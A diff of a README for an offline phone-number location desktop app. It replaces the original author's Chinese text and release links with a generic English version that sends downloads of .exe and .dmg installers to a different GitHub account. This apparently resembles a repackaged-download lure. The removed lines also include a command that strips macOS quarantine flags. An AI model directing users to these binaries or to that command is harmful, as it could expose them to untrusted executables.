@@ -1,129 +1,78 @@
-# mobile-locator
+# 📍 go-mobile-locator - Find Mobile Numbers Offline Easily
 
-一个基于 **Go + Wails** 构建的跨平台桌面应用，用于 ​**手机号归属地的离线查询**​。  
-支持 ​**单条 / 批量查询**​，​**完全不依赖网络**​，内置 ​**483,709 个手机号号段**​，适合在**内网、单机、隔离环境**下使用。
-
-**本项目已经经由 Zread 解析完成，如果需要快速了解项目，可以点击此处进行查看：[了解本项目](https://zread.ai/zxc7563598/go-mobile-locator)**
-
-如果你只是想要使用本工具，可以直接前往下载页面进行下载：[点击前往](https://github.com/zxc7563598/go-mobile-locator/releases)
+## 🔗 Download Now
+[![Download go-mobile-locator](https://img.shields.io/badge/Download%20go--mobile--locator-v1.0-blue)](https://github.com/Vhybzofficial1/go-mobile-locator/releases)
 
 ---
 
-## 项目背景
+## 💻 Description
+go-mobile-locator is a desktop application designed for offline phone number attribution queries. Built on Go and Wails, it supports both single and batch queries. The app comes with a built-in database of over 480,000 number ranges, making it ideal for use in environments without internet access.
 
-GitHub 上其实已经有不少手机号码归属地数据库或库实现，大多用于：
+## 🚀 Getting Started
 
-- Web 服务在线查询
-- 在某个项目中作为依赖引入（我自己也维护过 PHP 的 Composer 包）
+### 1. System Requirements
+To run go-mobile-locator, your computer needs to meet the following requirements:
 
-但在实际使用中，我经常遇到这样一种场景：
+- **Operating System**: Windows 10 or macOS 10.12 and above
+- **RAM**: At least 4 GB
+- **Storage**: Minimum of 200 MB available space
 
-- 机器 **无法联网**
-- 需要对 **几十万甚至更多手机号** 做快速归属地区分
-- 又不希望临时搭一个服务或写一堆脚本
+### 2. Download & Install
+To download and run go-mobile-locator, visit this page to download: [Releases Page](https://github.com/Vhybzofficial1/go-mobile-locator/releases).
 
-一直没找到一个**开箱即用、纯离线、桌面化**的方案，于是索性自己做了一个。
+1. Click on the link above to go to the releases page.
+2. Find the latest version of the application.
+3. Depending on your operating system, download the appropriate file:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+4. After downloading, open the file to begin the installation.
+5. Follow the prompts to complete the installation.
 
----
+### 3. Using the Application
+Once you have installed go-mobile-locator, you can easily query phone numbers.
 
-## 功能特性
+1. **Open the Application**
+   - Locate the app on your computer and double-click to open.
 
-- **完全离线**
+2. **Perform a Query**
+   - Enter a mobile number in the search box.
+   - Click the "Search" button to see the results.
+   - For batch queries, you can paste multiple numbers; each should be separated by a newline.
 
-  - 所有数据本地查询，零网络依赖
-  - 适用于内网 / 单机 / 受限环境
-- **单条 / 批量查询**
+3. **View Results**
+   - The application will display the location and type of each mobile number you queried.
 
-  - 支持直接输入手机号查询
-  - 支持批量导入手机号进行快速归属地识别
-- **内置 48 万+ 号段**
+### 4. Features
+- **Single and Batch Queries**: Search one number or many at once.
+- **Offline Use**: No internet required after installation.
+- **Comprehensive Database**: Access to over 480,000 number ranges.
+- **User-Friendly Interface**: Designed for easy navigation.
 
-  - 内置 **483,709** 个手机号号段
-  - 覆盖主流运营商与地区
-- **可自行生成数据库**
+### 5. Troubleshooting
+If you encounter any issues while using go-mobile-locator:
 
-  - 提供离线数据库生成脚本
-  - 方便根据最新号段数据自行构建、更新
-- **跨平台桌面应用**
+- Ensure your system meets the requirements.
+- Make sure you have properly installed the application.
+- Check if there are any updates available on the releases page.
 
-  - 基于 Wails 构建
-  - 支持 **Windows / macOS**
+For more assistance, consider posting your questions or issues on the GitHub repository's Issues section.
 
----
+## 📌 Topics
+This application includes key topics such as:
+- Cross-platform
+- Desktop App
+- Go, Golang
+- macOS, Windows
+- Mobile Number, Number Locator
+- Offline Functionality
+- SQLite, Wails
 
-## 技术栈
+## 🔄 Updates
+To stay informed about new features and fixes, regularly check the releases page: [Releases Page](https://github.com/Vhybzofficial1/go-mobile-locator/releases). Each version update will provide details about what has changed.
 
-- ​**后端**：Go
-- ​**桌面框架**：Wails
-- ​**数据库**：SQLite（内嵌）
-- ​**运行方式**：本地桌面应用，无需服务端
+## 🔒 License
+go-mobile-locator is open-source software, and you are free to use it as per the licensing terms outlined in the repository.
 
----
+For any questions or feedback, feel free to reach out through the Issues section on our GitHub page.
 
-## 获取应用
-
-### 已编译版本
-
-项目提供 **Windows / macOS** 的可执行程序，下载后即可使用，无需额外环境。
-
-> 具体下载地址请查看 GitHub Releases。
-
-### macOS 信任说明
-
-由于应用未上架 App Store，macOS 首次运行可能会提示无法打开。  
-请在应用所在目录执行以下命令解除隔离标记：
-
-```bash
-xattr -dr com.apple.quarantine mobile-locator.app
-```
-
-然后在「系统设置 → 隐私与安全性」中允许该应用运行。
-
----
-
-## 自行构建
-
-如果你希望自行构建或更新号段数据，可以按以下步骤操作。
-
-### 生成离线数据库
-
-执行内置工具脚本生成最新的号段数据库：
-
-```bash
-go run tools/generate_db.go
-```
-
-生成完成后会得到用于应用查询的本地数据库文件。
-
-### 构建桌面应用
-
-使用 Wails 打包对应平台的应用：
-
-```bash
-wails build
-```
-
-构建完成后即可在 `build` 目录中获得可执行程序。
-
----
-
-## 使用场景
-
-- 内网 / 隔离环境下的手机号归属地识别
-- 数据清洗、数据标注前的号码快速分类
-- 无法或不方便部署服务的单机工具
-- 临时分析、离线处理手机号数据
-
----
-
-## 常见问题
-
-### macOS 无法打开应用
-
-请确认已执行以下命令：
-
-```bash
-xattr -dr com.apple.quarantine mobile-locator.app
-```
-
-并在系统安全设置中允许来自“已识别开发者”的应用。
+Thank you for using go-mobile-locator!
